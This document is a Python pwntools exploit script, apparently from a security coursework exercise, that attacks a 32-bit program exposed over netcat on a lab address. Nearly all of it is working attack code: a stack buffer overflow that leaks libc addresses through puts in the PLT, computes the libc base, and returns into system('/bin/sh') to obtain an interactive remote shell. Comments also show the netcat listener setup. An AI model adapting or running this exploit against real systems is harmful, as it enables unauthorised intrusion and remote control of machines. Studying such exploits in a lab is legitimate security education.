# To set up the listener on the victim machine
# coproc ./itc_app
# nc -lvnkp 9000 <&"${COPROC[0]}" >&"${COPROC[1]}"

from pwn import *
import os
# Setting up the remote connection by providing IP and port
# This will connect to the server running on netcat
r = remote('192.168.56.101', 9000)

# Padding with the offset required to overflow the buffer
offset = b'A'*132

# Address for start of the main function
main = b'\x08\x04\x84\x7b'[::-1]

# Addresses of puts in the PLT, puts in the GOT and setvbuf in the GOT
# These are static as the program is not compiled with PIE
plt_puts_addr = b'\x08\x04\x83\x40'[::-1] #p32(0x8048340)
got_puts_addr = b'\x08\x04\x97\xac'[::-1] #p32(0x80497ac)
got_setvbuf_addr = b'\x08\x04\x97\xb4'[::-1] #p32(0x80497b4)

# Adding offset to the payload
payload = offset

''' 
Appending to the payload- the address of PUTs in the PLT
The argument for this is placed after the start of the main address,
the arg will be the GOT table address for puts.
This is because we call the puts function through the PLT
to output the address stored in the GOT.
Then it will return to the PLT puts and then output the setvbuf addr.
This however, will also output __libc_start_main- this is described in the report.
This will then return to the main function, enabling us to loop around and provide
another input.
'''
payload += plt_puts_addr + main + got_puts_addr + got_setvbuf_addr

# send the remote process the payload
r.sendline(payload)

# recieve the output from the remote process and split by newline
# splitting enables us to extract just the addresses that we want
# the addresses are stored in output[6]
output = r.recv().split(b"\n")
print(output)
# 4 bytes for 32 bit- 8 for 64 bit
address_size = 4
# There are 3 addresses, therefore the output[6] is split into 3 4 byte addresses
addresses = [output[6][i:i+address_size] for i in range(0, len(output[6]), address_size)]
print(addresses)
# Which address[index] is which address? 
# address[0] = puts() address
# address[1] =__libc_start_main address
# address[2] = setvbuf() in libc address

# Turning the puts() address to integer to calculate the base of libc
address_int = int.from_bytes(addresses[0], byteorder='little')

# Calculating the base of libc by subtracting the puts() offset (from libc database)
# from the puts() address that was leaked
base = address_int - 0x05fcb0
base_address_bytes = base.to_bytes(len(addresses[0]), byteorder='little')

# Calculating the addresses of system(), "/bin/sh" string and the exit() functions
# by adding the offsets from libc database to the base address calculated above
system = base + 0x03adb0
system_address_bytes = system.to_bytes(len(addresses[0]), byteorder='little')

bash_str = base + 0x15bb2b
bash_address_bytes = bash_str.to_bytes(len(addresses[0]), byteorder='little')

exit_addr = base + 0x2e9e0
exit_address_bytes = exit_addr.to_bytes(len(addresses[0]), byteorder='little')

'''
Offset to fill the buffer.
Then the system function location in libc- this will enable us to execute a shell command.
Then provide the exit() address, so the program doesn't crash.
Next provide the argument for the system() call, this 
argument will be the address of "/bin/sh".
This will then call system("/bin/sh")- giving a shell
'''
shell_payload = offset + system_address_bytes + exit_address_bytes + bash_address_bytes

# Send the 2nd payload to get the shell
# This is possible as we returned to main at the end of the previous payload
r.sendline(shell_payload)

# Switching to the interactive mode to interact with the remote shell.
r.interactive()

# Writes the addresses leaked by the program to a file "addrs" for inspection
# Used to find the version of libc->
with open('addrs', 'wb') as f:
    test = b"A"*132 # write the padding so I can view in GDB
    f.write(test+addresses[0]+addresses[1]+addresses[2])

# Writing the exploit payload into a file for local analysis by running in GDB
# Helps resolve any problems leaking addresses
with open('exploit', 'wb') as f:
    test = b"A"*132
    f.write(payload)